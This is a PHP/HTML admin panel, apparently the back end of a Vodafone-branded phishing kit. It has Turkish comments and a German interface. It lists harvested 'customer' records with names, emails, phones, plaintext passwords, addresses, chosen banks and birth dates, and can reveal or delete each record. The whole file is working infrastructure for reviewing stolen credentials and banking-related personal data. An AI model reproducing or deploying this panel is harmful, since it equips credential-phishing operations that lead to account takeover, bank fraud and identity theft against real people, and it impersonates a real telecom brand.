<?php
session_start();
require_once '../includes/db.php';

// Oturum kontrolü
if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: login.php');
    exit;
}

// Müşteri verilerini getir
$sql = "SELECT c.*, b.name as bank_name 
        FROM customer_data c 
        LEFT JOIN banks b ON c.bank_id = b.id 
        ORDER BY c.created_at DESC";
$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Vodafone</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="../assets/css/style.css" rel="stylesheet">
</head>
<body class="admin-dashboard">
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <img src="../assets/images/vodafone.png" alt="Vodafone" height="30">
                Admin Panel
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link active" href="index.php">Kunden</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="banks.php">Banken</a>
                    </li>
                </ul>
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="logout.php">
                            <i class="fas fa-sign-out-alt"></i> Abmelden
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container-fluid py-4">
        <div class="row">
            <div class="col-12">
                <div class="card shadow-sm">
                    <div class="card-header bg-white">
                        <h5 class="card-title mb-0">Kundeninformationen</h5>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table id="customerTable" class="table table-striped">
                                <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th>Name</th>
                                        <th>E-Mail</th>
                                        <th>Telefon</th>
                                        <th>Passwort</th>
                                        <th>Adresse</th>
                                        <th>Bank</th>
                                        <th>Geburtsdatum</th>
                                        <th>Erstellt am</th>
                                        <th>Aktionen</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php while($row = $result->fetch_assoc()): ?>
                                        <tr>
                                            <td><?php echo $row['id']; ?></td>
                                            <td><?php echo htmlspecialchars($row['first_name'] . ' ' . $row['last_name']); ?></td>
                                            <td><?php echo htmlspecialchars($row['email']); ?></td>
                                            <td><?php echo htmlspecialchars($row['phone']); ?></td>
                                            <td>
                                                <button type="button" class="btn btn-sm btn-secondary show-password" 
                                                        data-password="<?php echo htmlspecialchars($row['password']); ?>">
                                                    Anzeigen
                                                </button>
                                            </td>
                                            <td>
                                                <?php 
                                                echo htmlspecialchars($row['street'] . ' ' . $row['house_number'] . '<br>' .
                                                    $row['postal_code'] . ' ' . $row['city']); 
                                                ?>
                                            </td>
                                            <td><?php echo htmlspecialchars($row['bank_name']); ?></td>
                                            <td><?php echo date('d.m.Y', strtotime($row['birth_date'])); ?></td>
                                            <td><?php echo date('d.m.Y H:i', strtotime($row['created_at'])); ?></td>
                                            <td>
                                                <button type="button" class="btn btn-sm btn-danger delete-customer" 
                                                        data-id="<?php echo $row['id']; ?>">
                                                    <i class="fas fa-trash"></i>
                                                </button>
                                            </td>
                                        </tr>
                                    <?php endwhile; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Password Modal -->
    <div class="modal fade" id="passwordModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Passwort</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <p id="passwordText"></p>
                </div>
            </div>
        </div>
    </div>

    <!-- Delete Confirmation Modal -->
    <div class="modal fade" id="deleteModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Bestätigung</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <p>Möchten Sie diesen Kunden wirklich löschen?</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Abbrechen</button>
                    <button type="button" class="btn btn-danger" id="confirmDelete">Löschen</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap5.min.js"></script>
    <script>
        $(document).ready(function() {
            // DataTables initialization
            $('#customerTable').DataTable({
                language: {
                    url: '//cdn.datatables.net/plug-ins/1.11.5/i18n/de-DE.json'
                },
                order: [[0, 'desc']]
            });

            // Show password
            $('.show-password').click(function() {
                const password = $(this).data('password');
                $('#passwordText').text(password);
                new bootstrap.Modal($('#passwordModal')).show();
            });

            // Delete customer
            let customerIdToDelete = null;
            
            $('.delete-customer').click(function() {
                customerIdToDelete = $(this).data('id');
                new bootstrap.Modal($('#deleteModal')).show();
            });

            $('#confirmDelete').click(function() {
                if (customerIdToDelete) {
                    $.post('delete_customer.php', { id: customerIdToDelete })
                        .done(function(response) {
                            if (response.success) {
                                location.reload();
                            } else {
                                alert('Fehler beim Löschen des Kunden');
                            }
                        })
                        .fail(function() {
                            alert('Fehler beim Löschen des Kunden');
                        });
                }
            });
        });
    </script>
</body>
</html>
